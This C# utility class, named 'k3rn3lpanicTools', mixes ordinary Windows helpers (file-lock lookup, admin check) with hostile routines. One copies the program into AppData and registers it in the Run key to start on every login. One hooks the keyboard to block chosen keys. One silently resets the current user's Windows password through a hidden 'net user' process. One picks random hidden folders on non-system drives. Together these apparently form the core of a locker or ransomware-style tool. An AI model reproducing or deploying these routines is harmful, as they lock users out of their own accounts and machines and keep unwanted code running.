using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace k3rn3lpanicTools
{
    public class Tools
    {
        [StructLayout(LayoutKind.Sequential)]
        struct RM_UNIQUE_PROCESS
        {
            public int dwProcessId;
            public System.Runtime.InteropServices.ComTypes.FILETIME ProcessStartTime;
        }

        const int RmRebootReasonNone = 0;
        const int CCH_RM_MAX_APP_NAME = 255;
        const int CCH_RM_MAX_SVC_NAME = 63;

        enum RM_APP_TYPE
        {
            RmUnknownApp = 0,
            RmMainWindow = 1,
            RmOtherWindow = 2,
            RmService = 3,
            RmExplorer = 4,
            RmConsole = 5,
            RmCritical = 1000
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct RM_PROCESS_INFO
        {
            public RM_UNIQUE_PROCESS Process;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_APP_NAME + 1)]
            public string strAppName;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_SVC_NAME + 1)]
            public string strServiceShortName;

            public RM_APP_TYPE ApplicationType;
            public uint AppStatus;
            public uint TSSessionId;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bRestartable;
        }
        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
        static extern int RmRegisterResources(uint pSessionHandle,
                                                UInt32 nFiles,
                                                string[] rgsFilenames,
                                                UInt32 nApplications,
                                                [In] RM_UNIQUE_PROCESS[] rgApplications,
                                                UInt32 nServices,
                                                string[] rgsServiceNames);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
        static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

        [DllImport("rstrtmgr.dll")]
        static extern int RmEndSession(uint pSessionHandle);

        [DllImport("rstrtmgr.dll")]
        static extern int RmGetList(uint dwSessionHandle,
                                    out uint pnProcInfoNeeded,
                                    ref uint pnProcInfo,
                                    [In, Out] RM_PROCESS_INFO[] rgAffectedApps,
                                    ref uint lpdwRebootReasons);
        /// <summary>
        /// Find out what process(es) have a lock on the specified file.
        /// </summary>
        /// <param name="path">Path of the file.</param>
        /// <returns>Processes locking the file</returns>
        /// <remarks>See also:
        /// http://msdn.microsoft.com/en-us/library/windows/desktop/aa373661(v=vs.85).aspx
        /// http://wyupdate.googlecode.com/svn-history/r401/trunk/frmFilesInUse.cs (no copyright in code at time of viewing)
        ///
        /// </remarks>
        static public List<Process> WhoIsLocking(string path)
        {
            uint handle;
            string key = Guid.NewGuid().ToString();
            List<Process> processes = new List<Process>();

            int res = RmStartSession(out handle, 0, key);
            if (res != 0) throw new Exception("Could not begin restart session.  Unable to determine file locker.");

            try
            {
                const int ERROR_MORE_DATA = 234;
                uint pnProcInfoNeeded = 0,
                     pnProcInfo = 0,
                     lpdwRebootReasons = RmRebootReasonNone;

                string[] resources = new string[] { path }; // Just checking on one resource.

                res = RmRegisterResources(handle, (uint)resources.Length, resources, 0, null, 0, null);

                if (res != 0) throw new Exception("Could not register resource.");

                //Note: there's a race condition here -- the first call to RmGetList() returns
                //      the total number of process. However, when we call RmGetList() again to get
                //      the actual processes this number may have increased.
                res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, null, ref lpdwRebootReasons);

                if (res == ERROR_MORE_DATA)
                {
                    // Create an array to store the process results
                    RM_PROCESS_INFO[] processInfo = new RM_PROCESS_INFO[pnProcInfoNeeded];
                    pnProcInfo = pnProcInfoNeeded;

                    // Get the list
                    res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, processInfo, ref lpdwRebootReasons);
                    if (res == 0)
                    {
                        processes = new List<Process>((int)pnProcInfo);

                        // Enumerate all of the results and add them to the
                        // list to be returned
                        for (int i = 0; i < pnProcInfo; i++)
                        {
                            try
                            {
                                processes.Add(Process.GetProcessById(processInfo[i].Process.dwProcessId));
                            }
                            // catch the error -- in case the process is no longer running
                            catch (ArgumentException) { }
                        }
                    }
                    else throw new Exception("Could not list processes locking resource.");
                }
                else if (res != 0) throw new Exception("Could not list processes locking resource. Failed to get size of result.");
            }
            finally
            {
                RmEndSession(handle);
            }

            return processes;
        }

        /// <summary>
        /// Checks if application is run as admin or not
        /// </summary>
        /// <returns>Is_ADMIN ?</returns>
        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// Runs The given appname as administrator
        /// </summary>
        /// <param name="Appname"></param>
        public static void ExecuteAsAdmin(string Appname)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = Appname;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            try
            {
                proc.Start();
            }
            catch { }
            }


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern SafeFileHandle CreateFile(string lpFileName,
        FileSystemRights dwDesiredAccess, FileShare dwShareMode, IntPtr
        securityAttrs, FileMode dwCreationDisposition, FileOptions
        dwFlagsAndAttributes, IntPtr hTemplateFile);
        const int ERROR_SHARING_VIOLATION = 32;

        /// <summary>
        /// Checks and sees if a file is in use or not
        /// </summary>
        /// <param name="fileName">:/</param>
        /// <returns>bool : ISinUse ?</returns>
        public static bool IsFileInUse(string fileName)
        {
            bool inUse = false;

            SafeFileHandle fileHandle =
            CreateFile(fileName, FileSystemRights.Modify,
                  FileShare.Write, IntPtr.Zero,
                  FileMode.OpenOrCreate, FileOptions.None, IntPtr.Zero);
            if (fileHandle.IsInvalid)
                if (Marshal.GetLastWin32Error() == ERROR_SHARING_VIOLATION)
                    inUse = true;
                
            
            fileHandle.Close();
            return inUse;
        }

        private static void set_in_startup()
        {
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"//" + SystemInfo.GetInfo(SystemInfo.InfoType.AppName)))
                File.Copy(SystemInfo.GetInfo(SystemInfo.InfoType.ApplicationFullPath), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +"\\"+ SystemInfo.GetInfo(SystemInfo.InfoType.AppName));

            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue(SystemInfo.GetInfo(SystemInfo.InfoType.AppName), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\"+ SystemInfo.GetInfo(SystemInfo.InfoType.AppName));
        }
        
        /// <summary>
        /// Sets the program in startup registry
        /// If The Program is in startup already it would return true without doing anything
        /// </summary>
        /// <returns>Returns True if The Job is Done Succesfully</returns>
        public static bool setInStartup()
        {
            try
            {
                if (IsInStartup())
                    return true;
                set_in_startup();
                return true;
            }
            catch
            {
                return false;
            }
            
        }

        /// <summary>
        /// Checks if our Program is in startup or not
        /// </summary>
        /// <returns></returns>
        public static bool IsInStartup()
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string _key=key.GetValue(SystemInfo.GetInfo(SystemInfo.InfoType.AppName),"").ToString();
            bool DoesFileExist = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + SystemInfo.GetInfo(SystemInfo.InfoType.AppName));
            return (_key == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + SystemInfo.GetInfo(SystemInfo.InfoType.AppName))&&DoesFileExist;
        }
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);


        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        //System level functions to be used for hook and unhook keyboard input
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);
        //Declaring Global objects
        private static IntPtr ptrHook;
        private static LowLevelKeyboardProc objKeyboardProcess;
        private static Keys[] KK;
        private static IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));

                // Disabling Windows keys

                if (_IsKeyinKeys(objKeyInfo.key))
                {
                    return (IntPtr)1; // if 0 is returned then All the above keys will be enabled
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }
        private static bool _IsKeyinKeys(Keys a)
        {
            foreach(Keys k in KK)
            {
                if (k == a)
                {
                    return true;
                }
            }
            return false;
        }   
        public static bool disable_Keys(Keys[] _KK)
        {
            try
            {
                KK = _KK;
                ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
                objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
                ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
                return true;
            }
            catch {
                return false;
            }

        }
        public static bool ResetWindowsUserPassword(string NewPass)
        {
            if (!IsAdministrator())
            {
                return false;
            }
            Process QProc = new Process();
            QProc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            QProc.StartInfo.CreateNoWindow = true;
            QProc.StartInfo.Verb = "runas";
            QProc.StartInfo.WorkingDirectory = Environment.SystemDirectory;
            QProc.StartInfo.FileName = "net.exe";
            QProc.StartInfo.UseShellExecute = false;
            QProc.StartInfo.RedirectStandardError = true;
            QProc.StartInfo.RedirectStandardInput = true;
            QProc.StartInfo.RedirectStandardOutput = true;

            QProc.StartInfo.Arguments = @" user " + Environment.UserName + " " + NewPass;
            QProc.Start();

            QProc.Close();
            return true;
        }
        private static Random rnd = new Random();
        private static bool IsIgnorable(string dir)
        {
            if (dir.EndsWith("System Volume Information")) return true;
            if (dir.Contains("$RECYCLE.BIN")) return true;
            return false;
        }
        private static string[] GetAllSafeFiles(string path, string searchPattern = "*.*")
        {
            List<string> allFiles = new List<string>();
            string[] folders = Directory.GetDirectories(path);
            foreach (string folder in folders)
            {
                try
                {
                    if (!IsIgnorable(folder))
                    {
                        allFiles.Add(folder);
                    }
                }
                catch { } // Don't know what the problem is, don't care...
            }
            return allFiles.ToArray();
        }
        private static string GetRandomSubFolder(string root)
        {
            try
            {
                var di = new DirectoryInfo(root);
                var dirs = GetAllSafeFiles(root);
                var rnd = new Random();

                if (dirs.Length == 0)
                    return "";

                return dirs[rnd.Next(0, dirs.Length - 1)];
            }
            catch
            {
                return "";
            }

        }
        private static string _GetRandomFolder(string root)
        {
            var path = root;
            var depth = rnd.Next(1, 20);
            string output = "";
            for (int i = 0; i < depth; i++)
            {
                path = GetRandomSubFolder(path);

                if (path == "")
                    break;
                else
                    output = path;
            }

            return output;
        }
        public static string GetRandomFolder()
        {
            List<DriveInfo> all = new List<DriveInfo>();
            foreach (DriveInfo k in DriveInfo.GetDrives())
            {
                if (k.DriveType == DriveType.Fixed && k.Name != "C:\\")
                {
                    all.Add(k);
                }
            }
            if (all.Count > 0)
            {
                var r = new Random();
                return (_GetRandomFolder(all[r.Next(0, all.Count)].Name));
            }
            else {
                return "";
            }
        }
    }
}
